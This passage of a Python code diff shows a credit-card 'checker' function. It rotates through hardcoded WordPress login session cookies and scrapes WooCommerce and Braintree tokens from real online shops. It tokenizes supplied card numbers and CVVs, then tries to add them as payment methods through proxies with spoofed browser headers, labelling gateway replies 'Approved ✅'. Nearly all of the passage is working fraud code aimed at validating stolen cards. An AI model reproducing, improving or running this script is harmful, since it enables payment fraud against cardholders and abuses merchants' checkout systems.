mNvbS9teS1hY2NvdW50L2FkZC1wYXltZW50LW1ldGhvZCIsInR5cG8iOltdLCJjb2xsZWN0aW5nX3VzZXJfYWN0aXZpdHlfZGF0YSI6eyJjbGlja3MiOjF9fQ==',
 }
 
-  response = requests.post(
-    'https://glasshousesupply.com/my-account/add-payment-method/',
-    cookies=cookies,
-    headers=headers,
-    data=data,
-    proxies=proxy
-)
+  response = requests.post('https://lovedagainmedia.com/my-account/add-payment-method', cookies=cookies, headers=headers, data=data, proxies=proxy)
   text = response.text
   pattern = r'Reason: (.+?)\s*</li>'
   match = re.search(pattern, text)
@@ -571,170 +582,119 @@ def get_proxy():
         print(e)
         return None
 
-# Example usage
 
 
+# Example usage:
 
+import requests
+import re
+import user_agent
+import random
+import time
+import string
+import base64
+from bs4 import BeautifulSoup
 
 def Tele4(ccx):
-	import requests
-	import re
-	from re import findall
-	import random
-	import string
-	import user_agent
-	import base64
-	from user_agent import generate_user_agent
-	ccx = ccx.strip()
-	parts = re.split(r'[ |/]', ccx)
-	c = parts[0]
-	mm = parts[1]
-	ex = parts[2]
-	cvc = parts[3]
-	try:
-	    yy = ex[2] + ex[3]
-	    if '2' in ex[3] or '1' in ex[3]:
-	        yy = ex[2] + '7'
-	    else:
-	        pass
-	except:
-	    yy = ex[0] + ex[1]
-	    if '2' in ex[1] or '1' in ex[1]:
-	        yy = ex[0] + '7'
-	    else:
-	        pass
-	r=requests.session()
-	proxy = get_proxy()	
-	print(proxy)
-	user = user_agent.generate_user_agent()
-	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-	email = f"{username}@gmail.com"
-	user = generate_user_agent()
-	r = requests.session()
+    proxy = get_proxy()
+    print(proxy)
+    from user_agent import generate_user_agent
+    user = user_agent.generate_user_agent()
+    import requests
+    r=requests.session()
+    ccx = ccx.strip()
+    n = ccx.split("|")[0]
+    mm = ccx.split("|")[1]
+    yy = ccx.split("|")[2]
+    cvc = ccx.split("|")[3]
+    
+    if "20" in yy:  # Mo3gza
+        yy = yy.split("20")[1]
+    
+    with open('fileb3.txt', 'r') as file:
+        first_line = file.readline()
+        last_used_times = {}
+    
+    while True:
+        lines = '''aman44%7C1745318670%7CfpFbtDqO5XVF9PDHvau2XzCUQNt0fiQobJm0aPFGphr%7C7b22cfa64bbfb4e56efa23bd6f294acd4da43c40317e1f646ce44e811ad5bace
+amavyfyfofyfohun44%7C1745322607%7C8LTnYQKpyJJdx7IRQMdyOEr1dcdqvadieSJFjZDdV5l%7Ccf86ceb83fda2ee4dc1330c2d20fe337852a656632eeda419ab96b39b4af92ce
+jhonulove67%7C1745335073%7Ccd49lEhXFWH3AQdmhwOOYbnW7ZUtOaTvzjRp4MCRhOm%7C7af32f8990af11c9b5cc1e84688cfc66064bc345673a0675a5415d22b89cf947
+marienonaqueen78%7C1745336640%7C7xt4MrfSsvpbzh85BCkfFFoOT44Y00bHSKRagn0WHzt%7C651ce7bb8df3cc689378b83af016061c4bb3d02ecfd3c4f435f4f13d3d735e82
+xoxjhonmeena67%7C1745336956%7CYc9zIjWOaQMC7ErWSDAEWIdw8JW2Hhu5qzNvbdWSZ2C%7C03cb11f4d2495ee83c4ac2b7221375ba82a17a6b3002b652acce638d2e4b389c'''
+        lines = lines.strip().split('\n')
+        random_line_number = random.randint(0, len(lines) - 1)
+        big = lines[random_line_number]
+        current_time = time.time()
+        
+        if big in last_used_times:
+            time_since_last_use = current_time - last_used_times[big]
+            if time_since_last_use < 10:
+                continue    
+        
+        if big == first_line:
+            pass
+        else:
+            last_used_times[big] = current_time
+            break
+    
+    with open('fileb3.txt', 'w') as file:
+        file.write(big)
+        print(big)
 
-
-	headers={
-'User-Agent': user,
+    cookies = {
+    '_ga': 'GA1.1.5590199.1744108911',
+    'mailchimp_user_email': 'aman44%40gmail.com',
+    'wordpress_logged_in_a3a6a1469a1091436aba07df5e7aa87a': big,
+    'tinv_wishlistkey': '22122c',
+    'mailchimp_landing_site': 'https%3A%2F%2Fwww.flexinnovations.com%2Fmy-account%2Fadd-payment-methods%2F',
+    'tinvwl_wishlists_data_counter': '0',
+    '_ga_5BLLY83SK2': 'GS1.1.1744111647.2.1.1744111703.0.0.0',
 }
 
-	rrr=r.get("https://www.bebebrands.com/my-account/add-payment-method/",headers=headers, proxies=proxy)
-	login=findall(r'name="woocommerce-register-nonce" value="(.*?)"',rrr.text)[0]
-	print(login)
-
-
-
-	
-	response = requests.get("https://ipinfo.io/json", proxies=proxy)
-	print(response.text)
-
-
-
-
-
-
-
-
-	headers={
-'User-Agent': user,
+    headers = {
+    'authority': 'www.flexinnovations.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://www.flexinnovations.com/my-account/payment-methods/',
+    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': user,
 }
 
-	data = {
-    'username': email,
-    'email':email ,
-    'password': 'igxyfse7r77e58e88e84ies47s48e',
-    'wc_order_attribution_source_type': 'typein',
-    'wc_order_attribution_referrer': '(none)',
-    'wc_order_attribution_utm_campaign': '(none)',
-    'wc_order_attribution_utm_source': '(direct)',
-    'wc_order_attribution_utm_medium': '(none)',
-    'wc_order_attribution_utm_content': '(none)',
-    'wc_order_attribution_utm_id': '(none)',
-    'wc_order_attribution_utm_term': '(none)',
-    'wc_order_attribution_utm_source_platform': '(none)',
-    'wc_order_attribution_utm_creative_format': '(none)',
-    'wc_order_attribution_utm_marketing_tactic': '(none)',
-    'wc_order_attribution_session_entry': 'https://www.bebebrands.com/my-account/add-payment-method/',
-    'wc_order_attribution_session_start_time': '2025-03-30 06:24:01',
-    'wc_order_attribution_session_pages': '8',
-    'wc_order_attribution_session_count': '1',
-    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'woocommerce-register-nonce': login,
-    '_wp_http_referer': '/my-account/add-payment-method/',
-    'register': 'Register',
+    rrr = requests.get("https://www.flexinnovations.com/my-account/add-payment-methods/", cookies=cookies, headers=headers) 
+    nonce = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', rrr.text)[0]
+    print(nonce)
+    client = re.findall(r'"client_token_nonce":"(.*?)"', rrr.text)[0]   
+    print(client)
+
+    response = requests.get("https://ipinfo.io/json", proxies=proxy)
+    print(response.text)
+    
+    cookies = {
+    
+    '_ga': 'GA1.1.5590199.1744108911',
+    'mailchimp_user_email': 'aman44%40gmail.com',
+    'wordpress_logged_in_a3a6a1469a1091436aba07df5e7aa87a': big,
+    'tinv_wishlistkey': '22122c',
+    'mailchimp_landing_site': 'https%3A%2F%2Fwww.flexinnovations.com%2Fmy-account%2Fadd-payment-methods%2F',
+    'tinvwl_wishlists_data_counter': '0',
+    '_ga_5BLLY83SK2': 'GS1.1.1744111647.2.1.1744111743.0.0.0',
 }
 
-
-	response = r.post('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data, proxies=proxy)
-
-
-
-
-
-	headers={
-'User-Agent': user,
-}
-
-	 
-	addadres = r.get('https://www.bebebrands.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers,proxies=proxy)
-	
-	 
-	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', addadres.text).group(1)
-	print(address)
-
-
-
-
-
-
-	headers={
-'User-Agent': user,
-}
-
-	data = {
-    'billing_first_name': 'Jhon Cena',
-    'billing_last_name': 'Tera daddy',
-    'billing_company': 'Lund khao',
-    'billing_country': 'GB',
-    'billing_address_1': 'Near Walmart 45',
-    'billing_address_2': 'RT 34 riad 456',
-    'billing_city': 'New york',
-    'billing_state': 'New York',
-    'billing_postcode': 'S16 1XB',
-    'billing_phone': '6499494949',
-    'billing_email': email,
-    'save_address': 'Save address',
-    'woocommerce-edit-address-nonce': address,
-    '_wp_http_referer': '/my-account/edit-address/billing/',
-    'action': 'edit_address',
-}
-
-	response = r.post('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data=data, proxies=proxy)
-	
-
-
-
-
-
-
-
-	headers={
-'User-Agent': user,
-}
-
-	rrr=r.get("https://www.bebebrands.com/my-account/add-payment-method/",headers=headers, proxies=proxy)
-	nonce=findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',rrr.text)[0]
-	print(nonce)
-	client=findall(
-        r'"client_token_nonce":"(.*?)"', rrr.text)[0]   
-	print(client)
-	
-	headers = {
-    'authority': 'www.bebebrands.com',
+    
+    headers = {
+    'authority': 'www.flexinnovations.com',
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9',
     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://www.bebebrands.com',
-    'referer': 'https://www.bebebrands.com/my-account/add-payment-method/',
+    'origin': 'https://www.flexinnovations.com',
+    'referer': 'https://www.flexinnovations.com/my-account/add-payment-methods/',
     'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -742,25 +702,20 @@ def Tele4(ccx):
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
     'user-agent': user,
-    'x-requested-with': 'XMLHttpRequest',
 }
-	
-	data = {
-    'action': 'wc_braintree_credit_card_get_client_token',
-    'nonce': client,
-}
-	
-	rrr=r.post("https://www.bebebrands.com/wp-admin/admin-ajax.php", headers=headers, data=data, proxies=proxy)		
-	enc = rrr.json()['data']	
-	decoded_text = base64.b64decode(enc).decode('utf-8')
-	au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)[0]
-	print(au)
+    
+    data = {
+        'action': 'wc_braintree_credit_card_get_client_token',
+        'nonce': client,
+    }
+    
+    rrr = requests.post("https://www.flexinnovations.com/wp-admin/admin-ajax.php", cookies=cookies, headers=headers, data=data)       
+    enc = rrr.json()['data']    
+    decoded_text = base64.b64decode(enc).decode('utf-8')
+    au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)[0]
+    print(au)
 
-
-
-
-
-	headers = {
+    headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9',
@@ -778,19 +733,19 @@ def Tele4(ccx):
     'user-agent': user,
 }
 
-	json_data = {
+    json_data = {
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': 'b345ada0-c1b3-4fb8-8016-c2766b458acf',
+        'sessionId': '9ed715e1-c37c-407d-99a5-9f5da298ac66',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
         'input': {
             'creditCard': {
-                'number': c,
+                'number': n,
                 'expirationMonth': mm,
-                'expirationYear': ex,
+                'expirationYear': yy,
                 'cvv': cvc,
             },
             'options': {
@@ -801,87 +756,114 @@ def Tele4(ccx):
     'operationName': 'TokenizeCreditCard',
 }
 
+    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+    tok = response.json()['data']['tokenizeCreditCard']['token']
+    
+    
+    print(tok)
+    
+    
+    
+    
+    cookies = {
+    '_ga': 'GA1.1.5590199.1744108911',
+    'mailchimp_user_email': 'aman44%40gmail.com',
+    'wordpress_logged_in_a3a6a1469a1091436aba07df5e7aa87a': big,
+    'tinv_wishlistkey': '22122c',
+    'mailchimp_landing_site': 'https%3A%2F%2Fwww.flexinnovations.com%2Fmy-account%2Fadd-payment-methods%2F',
+    'tinvwl_wishlists_data_counter': '0',
+    '_ga_5BLLY83SK2': 'GS1.1.1744111647.2.1.1744112186.0.0.0',
+}   
+    
 
-	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxy)
-	tok=(response.json()['data']['tokenizeCreditCard']['token'])
-	print(tok)
-
-
-
-
-
-	headers={
-'User-Agent': user,
+   
+    
+    headers = {
+    'authority': 'www.flexinnovations.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://www.flexinnovations.com',
+    'referer': 'https://www.flexinnovations.com/my-account/add-payment-methods/',
+    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': user,
 }
-
-	data = [
+    
+    data = [
     ('payment_method', 'braintree_credit_card'),
-    ('wc-braintree-credit-card-card-type', 'master-card'),
+    ('wc-braintree-credit-card-card-type', 'visa'),
     ('wc-braintree-credit-card-3d-secure-enabled', ''),
     ('wc-braintree-credit-card-3d-secure-verified', ''),
     ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
     ('wc_braintree_credit_card_payment_nonce', tok),
-    ('wc_braintree_device_data', '{"correlation_id":"aeedb227d827de219bca31d9c4eedf00"}'),
+    ('wc_braintree_device_data', '{"correlation_id":"dc4adbf00618499f422cc24d6ffeedb6"}'),
     ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
     ('wc_braintree_paypal_payment_nonce', ''),
-    ('wc_braintree_device_data', '{"correlation_id":"aeedb227d827de219bca31d9c4eedf00"}'),
-    ('wc-braintree-paypal-context', 'shortcode'),
+    ('wc_braintree_device_data', '{"correlation_id":"dc4adbf00618499f422cc24d6ffeedb6"}'),
     ('wc_braintree_paypal_amount', '0.00'),
-    ('wc_braintree_paypal_currency', 'GBP'),
-    ('wc_braintree_paypal_locale', 'en_gb'),
+    ('wc_braintree_paypal_currency', 'USD'),
+    ('wc_braintree_paypal_locale', 'en_us'),
     ('wc-braintree-paypal-tokenize-payment-method', 'true'),
     ('woocommerce-add-payment-method-nonce', nonce),
-    ('_wp_http_referer', '/my-account/add-payment-method/'),
+    ('_wp_http_referer', '/my-account/add-payment-methods/'),
     ('woocommerce_add_payment_method', '1'),
 ]
 
+    response = requests.post(
+    'https://www.flexinnovations.com/my-account/add-payment-methods/',
+    cookies=cookies,
+    headers=headers,
+    data=data
+)
 
-	response = r.post('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data, proxies=proxy)
+    text = response.text
+    
+        
+    pattern = r'Reason: (.+?)\s*</li>'
+        
+    match = re.search(pattern, text)
+    if match:
+        result = match.group(1)
+        
+        if 'risk_threshold' in text:
+            result = "RISK: Retry this BIN later."
+    else:
+        if 'ad9ded' in text or 'Paymen8t method successfully added.' in text:
+            result = "Approved ✅"
+            return result
+        else:
+            try:
+                result = text.split('Status code ')[1].split('<')[0]
+                print(result)
+            except:
+                try:
+                    result = match
+                except:
+                    result = 'Unknow Response'
 
-
-
-
-
-
-	text = response.text
-		
-	pattern = r'Reason: (.+?)\s*</li>'
-		
-	match = re.search(pattern, text)
-	if match:
-		result = match.group(1)
-		if 'risk_threshold' in text:
-			result = "RISK: Retry this BIN later."
-	else:
-		if 'added' in text or 'Payment method successfully added.' in text:
-			result = "Approved ✅"
-			return result
-		else:
-			try:
-				result = text.split('Status code ')[1].split('<')[0]
-			except:
-				try:
-					result = match
-				except:
-					result = 'Unknow Response'
-
-	
-	if 'risk_threshold' in result:
-			return "RISK: Retry this BIN later."
-	elif 'You cannot add a new payment method so soon after the previous one' in result:
-		    return "Please wait for 20 seconds."
-	elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in result:
-		    return 'Approved ✅'
-	elif 'Duplicate card exists in the vault.' in result:
-		    return 'Approved ✅! - Duplicate'
-	elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
-		    return 'Approved ✅! - AVS-CVV'
-	elif "Invalid postal code" in result or "CVV." in result:
-		    return 'Approved ✅! - Invalid postal code and cvv'
-	elif "Card Issuer Declined CVV" in result:
-		    return 'Approved ✅! - Declined CVV'
-	elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
-		    return 'Approved ✅!'
-	else:
-		return result
-		
+    if 'risk_threshold' in result:
+        return "RISK: Retry this BIN later."
+    elif 'You cannot add a new payment method so soon after the previous one' in result:
+        return "Please wait for 20 seconds."
+    elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in result:
+        return 'Approved ✅'
+    elif 'Duplicate card exists in the vault.' in result:
+        return 'Approved ✅! - Duplicate'
+    elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
+        return 'Approved ✅! - AVS-CVV'
+    elif "Invalid postal code" in result or "CVV." in result:
+        return 'Approved ✅! - Invalid postal code and cvv'
+    elif "Card Issuer Declined CVV" in result:
+        return 'Approved ✅! - Declined CVV'
+    elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
+        return 'Approved ✅!'
+    else:
+        return result
